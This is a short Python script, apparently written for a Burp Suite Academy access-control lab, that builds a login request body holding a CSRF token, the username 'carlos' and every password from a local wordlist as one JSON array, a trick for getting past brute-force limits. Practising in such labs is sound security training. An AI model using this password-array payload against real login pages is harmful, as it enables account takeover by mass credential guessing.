#! /usr/bin/env python3
import json

d = dict()
d['csrf'] = "ejpO4e4ybv08ZhbkK3p15lh00pDyxcbt"
d['username'] = "carlos"
d['password'] = list()
for password in open('/home/kiddie/Documents/BurpSuiteAcademy/AccessControl/Bruteforcing/password.txt'):
    d['password'].append(password.strip())
print(json.dumps(d))


# print('{"csrf":"ejpO4e4ybv08ZhbkK3p15lh00pDyxcbt"', end=',')
# 
# for password in open('/home/kiddie/Documents/BurpSuiteAcademy/AccessControl/Bruteforcing/password.txt'):
#     print('"username":"carlos", "password":"{}"'.format(password.strip()), end=',')
# 
# print('}')
